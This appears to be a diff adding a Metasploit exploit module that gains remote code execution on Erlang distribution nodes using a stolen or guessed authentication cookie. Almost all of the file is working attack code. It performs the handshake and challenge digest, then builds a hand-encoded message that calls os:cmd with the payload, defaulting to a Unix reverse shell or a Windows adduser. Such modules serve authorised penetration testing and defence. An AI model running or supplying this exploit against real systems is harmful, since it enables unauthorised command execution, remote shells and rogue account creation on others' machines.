@@ -1,0 +1,156 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'Erlang Port Mapper Daemon Cookie RCE',
+        'Description'    => %q{
+          The erlang port mapper daemon is used to coordinate distributed erlang instances.
+          Should an attacker get the authentication cookie RCE is trivial. Usually, this
+          cookie is named ".erlang.cookie" and varies on location.
+        },
+        'Author'         =>
+          [
+            'Daniel Mende',              # blog post article
+            'Milton Valencia (wetw0rk)', # metasploit module
+          ],
+        'References'     =>
+          [
+            ['URL', 'https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/']
+          ],
+        'License'        => MSF_LICENSE,
+        'Platform'       => ['unix', 'win'],
+        'Arch'           => ARCH_CMD,
+        'Privileged'     => 'false',
+        'Targets'        =>
+          [
+            [ 'Unix',
+              'Platform' => 'unix',
+              'Arch' => ARCH_CMD,
+              'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},
+            ],
+            [ 'Windows',
+              'Platform' => 'win',
+              'Arch' => ARCH_CMD,
+              'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/adduser'},
+            ]
+          ],
+        'DefaultTarget'  => 0,
+        'DisclosureDate' => 'Nov 20, 2009', # https://github.com/erlang/otp/blob/master/lib/kernel/src/os.erl (history)
+      )
+    )
+
+    register_options(
+      [
+        OptString.new('COOKIE', [ true, 'Erlang cookie to login with']),
+        Opt::RPORT(25672)
+      ])
+  end
+
+  def generate_challenge_digest(challenge)
+    challenge = challenge.unpack('H*')[0].to_i(16).to_s
+
+    hash = Digest::MD5.new
+    hash.update(datastore['COOKIE'])
+    hash.update(challenge)
+
+    vprint_status("MD5 digest generated: #{hash.hexdigest}")
+    return [hash.hexdigest].pack('H*')
+  end
+
+  def exploit
+    connect
+
+    our_node = "#{rand_text_alphanumeric(6..12)}@#{rand_text_alphanumeric(6..12)}"
+
+    # SEND_NAME: send initial identification of who "we" are
+    send_name =  "\x00"                                     # Length: 0x0000
+    send_name << [(our_node.length+7).to_s(16)].pack('H*')  #
+    send_name << "\x6e"                                     # Tag: n
+    send_name << "\x00\x05"                                 # Version: R6 (5)
+    send_name << "\x00\x03\x49\x9c"                         # Flags (0x0003499c)
+    send_name << "#{our_node}"                              # <generated>@<generated>
+
+    # SEND_CHALLENGE_REPLY: return generated digest and its own challenge
+    send_challenge_reply =  "\x00\x15"  # Length: 21
+    send_challenge_reply << "\x72"      # Tag: r
+
+    # SEND: send the message to the node
+    send =  "\x00\x00\x00"                                                        # Length:0x00000000
+    send << [(0x50 + payload.raw.length + our_node.length*2).to_s(16)].pack('H*') #
+    send << "\x70"                                                                #
+    send << "\x83"                                                                # VERSION_MAGIC
+    send << "\x68"                                                                # SMALL_TUPLE_EXT (104)
+    send << "\x04"                                                                #   Arity: 4
+    send << "\x61"                                                                #     SMALL_INTEGER_EXT
+    send << "\x06"                                                                #       Int: 6
+    send << "\x67"                                                                #     PID_EXT (103)
+    send << "\x64\x00"                                                            #       Node:
+    send << [(our_node.length).to_s(16)].pack('H*')                               #         Length: strlen(Node)
+    send << "#{our_node}"                                                         #         Node
+    send << "\x00\x00\x00\x03"                                                    #       ID
+    send << "\x00\x00\x00\x00"                                                    #       Serial
+    send << "\x00"                                                                #       Creation
+    send << "\x64"                                                                #     InternalSegmentIndex
+    send << "\x00\x00"                                                            #       Len: 0x0000
+    send << "\x64"                                                                #     InternalSegmentIndex
+    send << "\x00\x03"                                                            #       Length: 3
+    send << "rex"                                                                 #       AtomText: rex
+    send << "\x83\x68\x02\x67\x64\x00"                                            #
+    send << [(our_node.length).to_s(16)].pack('H*')                               # Length: strlen(Node)
+    send << "#{our_node}"                                                         # Node
+    send << "\x00\x00\x00\x03"                                                    # ID
+    send << "\x00\x00\x00\x00"                                                    # Serial
+    send << "\x00"                                                                # Creation
+    send << "\x68"                                                                # SMALL_TUPLE_EXT (104)
+    send << "\x05"                                                                #   Arity: 5
+    send << "\x64"                                                                #     InternalSegmentIndex
+    send << "\x00\x04"                                                            #       Length: 4
+    send << "call"                                                                #       AtomText: call
+    send << "\x64"                                                                #     InternalSegmentIndex
+    send << "\x00\x02"                                                            #       Length: 2
+    send << "os"                                                                  #       AtomText: os
+    send << "\x64"                                                                #     InternalSegmentIndex
+    send << "\x00\x03"                                                            #       Length: 3
+    send << "cmd"                                                                 #       AtomText: cmd
+    send << "\x6c"                                                                #     LIST_EXT
+    send << "\x00\x00\x00\x01"                                                    #       Length: 1
+    send << "\x6b"                                                                #       Elements: k
+    send << "\x00"                                                                #       Tail
+    send << [(payload.raw.length).to_s(16)].pack('H*')                            # strlen(Command)
+    send << payload.raw                                                           # Command
+    send << "\x6a"                                                                # NIL_EXT
+    send << "\x64"                                                                # InternalSegmentIndex
+    send << "\x00\x04"                                                            #   Length: 4
+    send << "user"                                                                #   AtomText: user
+
+    sock.put(send_name)
+
+    # recieve servers "SEND_CHALLENGE" token (4 bytes)
+    print_status("Receiving server challenge")
+    challenge = sock.get
+    challenge = challenge[14,4]
+
+    send_challenge_reply << challenge
+    send_challenge_reply << generate_challenge_digest(challenge)
+
+    print_status("Sending challenge reply")
+    sock.put(send_challenge_reply)
+
+    if sock.get.length < 1
+      fail_with(Failure::UnexpectedReply, "Authentication Failed:#{datastore['COOKIE']}")
+    end
+
+    print_good("Authentication successful, sending payload")
+    sock.put(send)
+  end
+end
